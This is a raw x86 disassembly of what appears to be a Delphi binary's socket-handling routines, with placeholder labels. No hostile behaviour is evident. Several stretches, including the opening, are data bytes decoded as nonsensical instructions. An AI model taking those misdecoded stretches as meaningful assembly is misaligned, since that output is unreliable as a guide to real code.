add [ esi + edx * 4 ] dl
inc ecx
add al cl
xchg ebp eax
inc ecx
add ah cl
xchg ebp eax
inc ecx
add [ eax ] bh
xchg edx eax
inc ecx
add [ edx + edx * 4 + 0x54100041 ] dh
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + edx * 4 ] dh
cli
inc esi
add [ eax + 0x61 ] bl
inc ecx
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc eax 0x43644945
outsd
jne r-xdata
popad
outsb
insb
inc ebp
jb r-xdata
add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc al 0x45
dec ecx
push ebx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xfc
inc esi
add [ eax + eax ] cl
outsd
jb r-xdata
mov [ ecx ] es
cwde
mov [ ecx ] es
clc
add al [ edi ]
test al 0x8f
inc ecx
add [ eax - 0x47ffbe70 ] cl
nop
inc ecx
add [ eax + 0x5c004190 ] dh
add [ edi ] eax
xor al 0xfe
inc esi
add [ eax - 0x2 ] ch
inc esi
add [ eax - 0x1 ] bl
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc eax
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax - 0x6fffb902 ] ah
popad
outsb
insb
add [ gs : eax ] al
lea eax [ eax ]
push esp
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
xor eax [ eax ]
cwde
xor eax [ eax ]
dec ebp
popad
js r-xdata
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
jae r-xdata
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
in al 0xfd
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
std
inc esi
add [ eax + eax ] cl
add [ eax ] al
push 0x840046fc
xor eax [ eax ]
nop
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax ] bl
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
push 0x840046fc
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
inc eax
add [ eax ] bl
std
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
std
sti
inc esi
add al cl
pop edi
inc ecx
add [ eax + eax ] al
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
push esp
add bh bh
add [ eax ] eax
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
cmp al 0x10
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
dec eax
add [ ebx - 0x74307500 ] cl
salc
call sub_46cfa8
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
add [ eax ] al
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
imul ebp [ esi + 0x64 ] 0x74726f50
arpl [ ebx + 0x65 ] bp
je r-xdata
sar [ ebp + edi * 8 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ ebp + edi * 8 + 0x46 ] bh
add [ eax + eax ] cl
add [ eax ] al
push 0x840046fc
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
inc esi
sub_46fdf8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_46cfa8
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_47038c
sub_46fe34
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] 0x0
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x1
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_46fe68
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_470344
mov eax ebx
call sub_470368
sub_46fea0
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f3c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_46fed0
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
pop ebp
retn 0x4
sub_46fef4
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop ebx
pop ebp
retn 0x4
sub_46ff18
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cf54
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46ff58
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_46ff84
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_470098
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax ebx
call sub_4703bc
test al al
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47009f
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f74
retn
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jle r-xdata
mov eax ebx
call sub_470410
test al al
jne r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
jmp r-xdata
sub_4700a4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_403fa4
mov [ ebx + 0x20 ] edi
pop edi
pop esi
pop ebx
retn
sub_4700c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cf54
pop esi
pop ebx
retn
sub_4700e8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov dl 0x1
mov eax edi
call sub_47038c
lea eax [ edi + 0x1c ]
push eax
lea ecx [ edi + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov esi eax
push 0x1
mov [ esp + 0x4 ] 0x2714
mov [ esp + 0x8 ] 0x2736
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46cf60
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ edi + 0xc ] esi
mov [ edi + 0x10 ] 0x1
mov eax edi
call sub_470344
mov eax edi
call sub_470368
sub_47015c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_418f04
mov dl 0x1
mov eax edi
call sub_47038c
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4701b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4702e5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ r-xdata ]
call sub_46f3a4
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4702c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418454
push 0x0
push esi
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_46f360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403154
retn
cmp esi 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp esi eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x34 ]
mov eax ebx
call sub_4701b4
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx esi
sub edx eax
mov eax ebx
call sub_4701b4
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4702ec
lea eax [ ebp - 0xc ]
call sub_403f50
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
sub_4702f8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40309c
mov edi eax
mov eax esi
call sub_40309c
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_403fa4
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_403fa4
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_418bac
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_470344
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_470368
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_47038c
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_403f50
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_403f50
xor eax eax
mov [ ebx + 0x1c ] eax
sub_4703bc
push ebx
push esi
push ecx
mov esi eax
push 0x0
mov eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x2
mov edx [ esi + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx eax
mov [ esp + 0x4 ] 0x2740
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cf60
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_470344
sub_470410
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x28 ]
mov esi [ ebp + 0x24 ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x1c ] edi
mov eax ebp
call sub_4703bc
test al al
je r-xdata
sub_470440
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx ecx
mov esi edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4704b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418454
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_46f360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4704bc
mov eax [ ebp - 0x8 ]
call sub_403154
retn
sub_4704e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_419638
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_470538
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47055d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470564
retn
sub_4707c5
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] bl
adc [ edx ] al
nop
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah cl
cmovb eax [ eax ]
dec eax
sub [ eax ] eax
dec eax
sub [ eax ] eax
adc dl [ ecx + ecx * 2 + 0x64 ]
push ebx
jb r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
jb r-xdata
or [ ebx + 0x4c438bd3 ] cl
outsb
je r-xdata
or [ ebx + 0x44438bd3 ] cl
jb r-xdata
jo r-xdata
retn
nop
and al 0x8
inc edi
add [ edi ] al
adc dl [ ecx + ecx * 2 + 0x64 ]
push ebx
jb r-xdata
fimul [ ebx - 0x742dcc10 ]
jb r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
outsb
je r-xdata
mov edx esi
call [ ebx + 0x40 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
je r-xdata
jb r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
mov [ esi + 0x38 ] 0x1
add esp 0xfffffff0
call sub_4034a0
jo r-xdata
mov eax esi
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
pop es
sti
aam 0x7
inc edi
add [ eax + esi * 8 + 0x20046 ] ch
or ecx [ ecx + 0x64 ]
dec ecx
outsb
je r-xdata
inc esi
inc esi
cmp [ ecx ] al
jb r-xdata
jo r-xdata
pop esi
pop ebx
retn
add [ eax ] al
add [ ebx - 0x3974f33c ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop ebx
retn
call [ ebx + 0x48 ]
mov edx ebx
mov eax [ ebx + 0x4c ]
sub_470870
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x30 ] esi
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_470894
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
mov [ esi + 0x38 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4708d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx + 0x52 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
push 0x0
push 0x0
mov eax esi
call sub_41aae4
sub_470900
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
push 0x0
push 0x0
mov eax esi
call sub_41aae4
sub_470930
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4212e8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x34 ]
jne r-xdata
xor eax eax
mov [ esi + 0x34 ] eax
sub_4709a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4709c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4709d0
retn
sub_470acc
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46f7b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_470b00
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_470b25
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470b2c
retn
sub_470d70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_418f04
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x10 ] eax
mov eax esi
call sub_470d54
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_470dbc
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
lea eax [ esi + 0x10 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f3c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_470dec
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_470f31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f50
cmp [ ebx + 0xc ] 0x0
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_403f50
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470f38
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_403f74
retn
mov edx esi
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ esi ]
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0xc ]
call sub_408080
push [ ebp - 0x1c ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4042d0
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
push [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0xc ]
call sub_408080
push [ ebp - 0x14 ]
push r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x18 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4042d0
push [ esi ]
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
call sub_408080
push [ ebp - 0xc ]
push r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x10 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4042d0
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax [ ebp - 0x4 ]
jle r-xdata
jmp r-xdata
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
sub_470f64
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47105f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_470d54
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471066
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_403f74
retn
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx 0x4
mov edx 0x1
call sub_404470
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407f4c
mov eax [ ebp - 0xc ]
call sub_404210
cmp eax 0x4
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax esi
call sub_47110c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
inc ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40459c
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x5
call sub_404470
mov edx [ ebp - 0x18 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
sub_471070
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jg r-xdata
mov al 0x1
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
xor eax eax
pop ebx
retn
sub_471090
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4710db
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebx + 0xc ] esi
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4710e2
lea eax [ ebp - 0x4 ]
